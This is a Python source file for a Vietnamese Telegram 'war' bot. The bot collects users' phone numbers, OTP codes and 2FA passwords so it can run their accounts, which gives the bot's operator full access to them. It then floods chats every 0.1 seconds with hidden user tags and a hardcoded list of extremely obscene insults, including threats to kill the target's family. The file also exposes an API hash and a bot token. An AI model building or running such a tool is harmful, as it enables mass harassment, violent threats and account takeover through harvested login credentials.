import logging
import asyncio
import random
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# --- CẤU HÌNH API & BOT ---
API_ID = 39485214
API_HASH = "cd3c7822f740b7b7af660de3cb1c9f9d"
BOT_TOKEN = "8704592597:AAEK_FoX078pKAYtFqSoPGLINMEf1Y2QakQ"
ADMIN_ID = 7907990385
ADMIN_USERNAME = "ducnamkyy"

# --- MỞ CỔNG HTTP GIẢ LẬP CHO RENDER ---
class DummyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot Hot War 2026 is running successfully!")

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), DummyHandler)
    server.serve_forever()

threading.Thread(target=run_web_server, daemon=True).start()

# TRẠNG THÁI HỆ THỐNG
active_user_clients = {}
active_tasks = {}
user_states = {} 

WAR_WORDS = [
    (
        "bố con mẹ m còn địt con cụ m thk óc lợn ba vạn ngu lồn ơi cái thứ mồ côi "
        "không nơi nương tựa óc lồn cặc bã loại thk não tật mà quyền lực hạn hẹp ngôn từ khuyết tật. "
        "Thk mặt cặc khiếm khuyết tinh trùng . thằng đĩ cha mày bắn tinh nổ cả dương vật , khiếm khuyết cả 2 hòn dái "
        "vô cái lỗ lồn con đĩ bà già nhà mày mãi mà chỉ đẻ được thứ súc sinh phế vật óc cặc đú đờn như mày hả cái thứ phế vật trần gian , "
        "thk óc lợn bị bố mày chửi cho khuyết tật thị giác luôn ae ạ , thằng óc lợn này cay bố mày quá liệt cả tinh hoàn à "
        "cái thứ đĩ điếm sĩ đời đầu thai 9 kiếp vẫn chưa hết sĩ , con đĩ cha m thk cặp kè với mấy con lồn già u80 để nuôi nấng m hả thk ngu @Ducducdz"
    ),
    (
        "con đĩ mẹ m phải quỳ xuống bú cặc liếm tinh cho t được vào sàn mà m vẫn phế như chó đẻ vậy hả thằng ngu ăn cứt gà uống đái chó, "
        "cái thằng đĩ cụ tổ nhà m nó thất vọng vì có 1 thằng cháu đã vô sinh còn vô dụng như m nên ổng thắt cổ tự tử luôn r kìa thằng đú phế ỉa ơi, "
        "m gõ mãi mới ra 1 câu vậy hả con đĩ mẹ m, đít tắc cứt nên gõ k lại cha đúng kh con thú đú war ngu si tứ tri óc vật =)))"
    ),
    (
        "m còn cái cặc gì mới mẻ hơn cái ngôn sứt vỡ của m k vậy cái thằng ngu nứng cu sục buồi hút tinh sặc nước lồn "
        "con đĩ bà m bị t cầm đinh ba xiên lồn qua đời trên giường bệnh h bả nằm ở nhà xác khoa nhi bệnh viện mà k thể siêu thoát "
        "khi có đứa cháu phế vật như mày mà cái thằng mồ côi chó đẻ ăn hại mọi vùng miền, t gõ vừa nhanh vừa gọn còn m gõ như đánh rắm "
        "vào mặt cả nhà m thế con thú hoang vô sinh vô giác ơi, m đéo biết chat thì m bật con mắt m lên full HD mà coi t chat chửi "
        "đột quỵ cả dòng tộc m luôn nè thằng đầu buồi mặt cặc"
    ),
    (
        "t chửi m mà h đơ người liệt dây thần kinh não thần hồn nát thần tính xong m trầm cảm đến mức m bị bb cô lập r xa lánh "
        "vì nói xàm cặc nhảm 3 xàm 9 vạn con đĩ mẹ m chết kh nhắm mắt vì m gây nên nỗi ô nhục lớn 9 kiếp cx k quên được đó thằng chó vô gia cư "
        "ở nhà lá đá ống bơ, cả nhà m phải làm trò hề cho nhân loại để được tồn tại trên thế giới này nếu không t giết cả nhà m "
        "t hỏa táng từng đứa t mang tro cốt t đổ cho chó nhai xương dòng tộc nhà m"
    ),
    (
        "m mỏi tay hay m chat k nổi mà lề mề như con sên vậy, m dậy chat đi con đĩ mẹ m nó bị t địt cho liệt buống trứng "
        "đang cấp cứu ở bệnh viện phải nằm truyền nước lồn kia kìa thằng ngu ngục ơi, t tống m vô song sắt ngồi ăn cơm tù "
        "nhìn cảnh t đụ mẹ m lìa trần ỉa ra quần nè cái thứ súc sinh ăn cơm trên bàn thờ ông địa r bị giật điện qua đời ở tuổi 13 =))"
    ),
    (
        "Đến lúc con mẹ mày được nhét vô trong quan tài thì tao lại đào lên và vắt dái ra đái vô mồm lồn con đĩ mẹ mày =))=))=))=))=))=))=)) "
        "cái bọn tật nguyền này chửi ngu như bị máy rung dập lồn nhau vậy các em , anh đây chuyên gia vớt xác mấy con chó đẻ chúng mày "
        "để anh ỉa vô cái họng thối nát của mày mà em, anh trù mày ra đường bị xe công ten nơ tông nát sọ phọt cái óc lồn mày ra đường "
        "cho chó liếm láp sạch sẽ thì thôi . cái thứ dơ bẩn đến từng tế bào da thịt , dơ từ trong tâm hồn dơ ra đến thể xác , "
        "thối nát đến nỗi con ruồi còn pk đột tử khi ngửi mùi lồn của mày á thằng phế vật mxh"
    ),
    (
        "clm thằng đú bị hiv sẩy mụn cặc vì địt nhau quá 180 kiếp =))) cái thằng cha m nó ôm hận t vì t giết chết con bà m "
        "vì cả nhà m có truyền thống loạn luận mẹ và con mà đúng kh thằng vô danh ăn cứt , chó dại hoang tàn cali bú buồi sặc cặc =)) "
        "cả lò m địt nhau tê buồi rách lồn còn đến đời m thì thất truyền vì m bị vô sinh giai đoạn cuối k thể sinh con "
        "nên m tính bắt cóc con của ngkhac mang về cho mẹ vợ xem để bả thương bả còn cho m ở lại nhà =))"
    ),
    (
        "thằng lồn ngu hút buồi sặc tinh bất tỉnh nhân sự bị tao ỉa cứt chọi vô xác m trong xe tang lạnh lẽo của con đĩ mẹ mày "
        "thì tao triệu hồi jack 97 quẩy tung nóc quan tài m ra t đái vô xương cốt của đĩ má m cho m ôm hận t 9 kiếp còn lại "
        "nhưng đéo làm được gì, =))) thằng lồn bú trinh bf già u80 để tiếp tục được sống trong vô vọng =)), "
        "ước mơ trở thành dân war của m bị t đá bay đi ngay khi m làm trò xiếc khỉ trước mặt tao mà cái thằng đầu buồi ăn cứt uống đái bú tục lói phét =))"
    )
]

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
bot = TelegramClient('bot_manager_session', API_ID, API_HASH)

def create_hidden_tag(user_id=1531685790491480419):
    return f"[\u200b](tg://user?id={user_id})"

async def get_authorized_client(event):
    user_id = event.sender_id
    if user_id not in active_user_clients or not await active_user_clients[user_id]["client"].is_user_authorized():
        await event.respond("⛔ Bạn chưa đăng nhập! Vui lòng gửi `/login` để bắt đầu.")
        return None
    return active_user_clients[user_id]["client"]


# ================== HỆ THỐNG ĐĂNG NHẬP TRỰC TIẾP TRÊN BOT ==================

@bot.on(events.NewMessage(pattern=r'^/login$'))
async def login_start(event):
    user_id = event.sender_id
    user_states[user_id] = {'step': 'WAITING_PHONE'}
    await event.respond("👉 **Vui lòng nhập số điện thoại của bạn:**\n*(Ví dụ: +84912345678)*")
    raise events.StopPropagation

@bot.on(events.NewMessage())
async def handle_login_steps(event):
    user_id = event.sender_id
    if user_id not in user_states:
        return

    text = event.message.text.strip()
    current_state = user_states[user_id]['step']

    if current_state == 'WAITING_PHONE':
        if not text.startswith('+') and not text.isdigit():
            await event.respond("❌ Số điện thoại không hợp lệ. Vui lòng nhập lại đúng định dạng (Ví dụ: +84...):")
            raise events.StopPropagation
            
        phone = text if text.startswith('+') else f"+{text}"
        await event.respond(f"⏳ Đang khởi tạo phiên và gửi mã OTP tới **{phone}**...")

        try:
            user_session = StringSession()
            user_client = TelegramClient(user_session, API_ID, API_HASH)
            await user_client.connect()
            
            sent_code = await user_client.send_code_request(phone)
            
            user_states[user_id] = {
                'step': 'WAITING_CODE',
                'client': user_client,
                'phone': phone,
                'phone_code_hash': sent_code.phone_code_hash
            }
            
            await event.respond("✅ Đã gửi mã OTP thành công!\n📩 **Vui lòng nhập mã OTP nhận được:**")
            
        except Exception as e:
            await event.respond(f"❌ Lỗi gửi mã: {e}\nVui lòng gửi lại `/login` để thử lại.")
            if user_id in user_states:
                del user_states[user_id]
            
        raise events.StopPropagation

    elif current_state == 'WAITING_CODE':
        code = text
        user_data = user_states[user_id]
        user_client = user_data["client"]

        try:
            await user_client.sign_in(
                phone=user_data["phone"], 
                code=code, 
                phone_code_hash=user_data["phone_code_hash"]
            )
            
            active_user_clients[user_id] = {"client": user_client}
            
            await event.respond("🎉 **ĐĂNG NHẬP THÀNH CÔNG!**\nToàn bộ tính năng chiến đấu đã được mở khóa. Gõ `/start` để xem danh sách lệnh.")
            del user_states[user_id]
            
        except SessionPasswordNeededError:
            user_states[user_id]['step'] = 'WAITING_2FA'
            await event.respond("🔒 Tài khoản có bật bảo mật 2 lớp (2FA).\n🔑 **Vui lòng nhập mật khẩu 2FA:**")
        except PhoneCodeInvalidError:
            await event.respond("❌ Mã OTP không chính xác! Vui lòng nhập lại mã OTP:")
        except Exception as e:
            await event.respond(f"❌ Lỗi đăng nhập: {e}\nVui lòng gửi `/login` để làm lại.")
            if user_id in user_states:
                del user_states[user_id]
            
        raise events.StopPropagation

    elif current_state == 'WAITING_2FA':
        password = text
        user_data = user_states[user_id]
        user_client = user_data["client"]
        
        try:
            await user_client.sign_in(password=password)
            active_user_clients[user_id] = {"client": user_client}
            await event.respond("🎉 **XÁC THỰC 2FA THÀNH CÔNG!**\nBot đã sẵn sàng chiến đấu!")
            del user_states[user_id]
        except Exception as e:
            await event.respond(f"❌ Mật khẩu 2FA sai ({e}). Vui lòng nhập lại mật khẩu:")
            
        raise events.StopPropagation


# ================== CÁC LỆNH SỬ DỤNG ==================

@bot.on(events.NewMessage(pattern=r'/start'))
async def send_welcome(event):
    if event.sender_id in user_states: return
    text_msg = (
        "🔥 HỆ THỐNG BOT HOT WAR 2026\n\n"
        "• /login → Đăng nhập tài khoản trực tiếp\n"
        "• /war → Spam war liên tục tốc độ cao kèm tag ẩn\n"
        "• /spam [nội dung] → Spam văn bản tùy chỉnh\n"
        "• /sptru → Spam chậm tốc độ 1s/tin\n"
        "• /stop → Dừng toàn bộ quá trình đang chạy\n\n"
        "👉 Bắt đầu: Gửi lệnh /login để kết nối tài khoản ngay!\n"
        f"Admin: @{ADMIN_USERNAME}"
    )
    await event.respond(text_msg)


@bot.on(events.NewMessage(pattern=r'/war'))
async def user_war(event):
    if event.sender_id in user_states: return
    user_client = await get_authorized_client(event)
    if not user_client: return

    chat_id = event.chat_id
    active_tasks[chat_id] = True
    reply_to = event.get_reply_message().id if event.is_reply else None
    
    await event.respond("🔥 Bắt đầu chiến war tốc độ cao!")
    
    while active_tasks.get(chat_id, False):
        try:
            msg = random.choice(WAR_WORDS) + " " + create_hidden_tag()
            await user_client.send_message(chat_id, msg, parse_mode='md', reply_to=reply_to)
            await asyncio.sleep(0.1)
        except Exception:
            await asyncio.sleep(0.2)

@bot.on(events.NewMessage(pattern=r'/spam (.+)'))
async def user_spam(event):
    if event.sender_id in user_states: return
    user_client = await get_authorized_client(event)
    if not user_client: return

    chat_id = event.chat_id
    spam_text = event.pattern_match.group(1)
    active_tasks[chat_id] = True
    
    while active_tasks.get(chat_id, False):
        try:
            msg = spam_text + " " + create_hidden_tag()
            await user_client.send_message(chat_id, msg, parse_mode='md')
            await asyncio.sleep(0.1)
        except Exception:
            await asyncio.sleep(0.2)

@bot.on(events.NewMessage(pattern=r'/sptru'))
async def user_sptru(event):
    if event.sender_id in user_states: return
    user_client = await get_authorized_client(event)
    if not user_client: return

    chat_id = event.chat_id
    active_tasks[chat_id] = True
    
    while active_tasks.get(chat_id, False):
        try:
            msg = random.choice(WAR_WORDS) + " " + create_hidden_tag()
            await user_client.send_message(chat_id, msg, parse_mode='md')
            await asyncio.sleep(1.0)
        except Exception:
            await asyncio.sleep(1.0)

@bot.on(events.NewMessage(pattern=r'/stop'))
async def user_stop(event):
    if event.sender_id in user_states: return
    user_client = await get_authorized_client(event)
    if not user_client: return
    active_tasks[event.chat_id] = False
    await event.respond("🛑 Đã dừng toàn bộ tiến trình!")


async def main():
    print(f"🔥 Bot Hot War 2026 của @{ADMIN_USERNAME} đã sẵn sàng hoạt động!")
    await bot.start(bot_token=BOT_TOKEN)
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
